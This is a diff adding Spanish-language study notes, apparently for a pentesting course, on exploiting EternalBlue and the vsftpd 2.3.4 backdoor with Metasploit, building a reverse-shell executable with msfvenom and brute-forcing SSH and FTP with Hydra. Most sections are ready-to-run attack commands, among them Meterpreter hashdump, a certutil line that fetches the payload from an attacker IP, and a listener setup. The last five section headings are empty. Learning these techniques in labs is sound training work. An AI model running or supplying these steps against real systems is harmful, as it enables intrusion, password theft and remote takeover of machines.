@@ -1,0 +1,156 @@
+---
+title: "Explotación de Vulnerabilidades y Ataques de Fuerza Bruta"
+num: "03"
+status: "done"
+---
+
+# 01. Uso Básico de Metasploit - Explotación EternalBlue en Windows
+
+EternalBlue explota una vulnerabilidad en el protocolo SMB de Windows. Es una de las más famosas — fue usada en WannaCry.
+
+```bash
+msfconsole
+```
+
+```bash
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS <IP víctima>
+run
+```
+
+> Si el exploit falla a la primera, intenta con `set payload windows/x64/meterpreter/reverse_tcp` antes de correr.
+
+Una vez dentro tendrás una sesión **Meterpreter** — desde ahí puedes moverte por el sistema:
+
+```bash
+sysinfo          # info del sistema
+getuid           # usuario actual
+hashdump         # volcar hashes de contraseñas
+shell            # abrir cmd de Windows
+```
+
+---
+
+# 02. Uso Básico de Metasploit - Explotación vsftpd en Linux
+
+vsftpd 2.3.4 tiene una backdoor que abre una shell en el puerto 6200 cuando el usuario contiene `:)` en el login. Clásico en labs de Linux.
+
+**Primero, reconocimiento:**
+
+```bash
+# Descubrir hosts en la red
+arp-scan -I eth0 --localnet
+
+# Escaneo completo al objetivo
+nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 192.168.1.18 -oN escaneo.txt
+
+# Verificar si el puerto 21 es vulnerable
+nmap --script vuln -p 21 192.168.1.18
+```
+
+**Luego, explotar con Metasploit:**
+
+```bash
+msfconsole
+search vsftpd 2.3.4
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set RHOSTS <IP víctima>
+run
+```
+
+> Si obtienes una shell básica, puedes mejorarla con `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+
+---
+
+# 03. Msfvenom - Generar Nuestros Propios Payloads
+
+Cuando no puedes explotar directamente con Metasploit, generas un ejecutable malicioso, lo entregas a la víctima y esperas la conexión.
+
+**1. Generar el payload:**
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=<IP atacante> \
+  LPORT=443 \
+  -f exe \
+  -o pwned.exe
+```
+
+| Flag     | Descripción                             |
+| -------- | --------------------------------------- |
+| `-p`     | Tipo de payload                         |
+| `LHOST`  | Tu IP (la que recibirá la conexión)     |
+| `LPORT`  | Puerto en escucha (443 pasa como HTTPS) |
+| `-f exe` | Formato del archivo de salida           |
+| `-o`     | Nombre del archivo generado             |
+
+**2. Servir el archivo a la víctima:**
+
+```bash
+python3 -m http.server 80
+```
+
+La víctima descarga con: `certutil -urlcache -f http://<IP atacante>/pwned.exe pwned.exe`
+
+**3. Ponerse en escucha ANTES de que la víctima ejecute el archivo:**
+
+```bash
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <IP atacante>
+set LPORT 443
+run
+```
+
+> El orden importa — primero el listener, luego la víctima ejecuta el payload.
+
+---
+
+# 04. Uso de Hydra - Ataques de Fuerza Bruta a Contraseña (SSH y FTP)
+
+Hydra prueba combinaciones de usuario/contraseña automáticamente. Útil cuando encuentras un servicio SSH o FTP sin credenciales conocidas.
+
+**SSH:**
+
+```bash
+hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://<IP víctima>
+```
+
+**FTP:**
+
+```bash
+hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ftp://<IP víctima>
+```
+
+| Flag   | Descripción                                       |
+| ------ | ------------------------------------------------- |
+| `-l`   | Usuario específico (si lo conoces)                |
+| `-L`   | Lista de usuarios (si no lo conoces)              |
+| `-p`   | Contraseña específica                             |
+| `-P`   | Lista de contraseñas (wordlist)                   |
+| `-t 4` | Hilos paralelos (por defecto 16, bájalo si falla) |
+
+Si encuentras un usuario en un archivo o en la web de la máquina, úsalo con `-l`. Rockyou suele ser suficiente para los labs.
+
+```bash
+# Si no sabes el usuario, prueba con lista común
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
+      -P /usr/share/wordlists/rockyou.txt \
+      ssh://<IP víctima> -t 4
+```
+
+> Hydra puede ser ruidoso — en entornos reales genera muchos logs.
+
+# 05. Uso de Hydra - Ataques de Fuerza Bruta a Usuarios (SSH y FTP)
+
+# 06. Uso de Hydra - Ataques de Fuerza Bruta a Paneles de Login Web
+
+# 07. Ataquers de Fuerza bruta con Metasploit
+
+# 08. Ataques de Fuerza Bruta contra Base de Datos
+
+# 09. Ataques de Fuerza Bruta en Local con John The Ripper
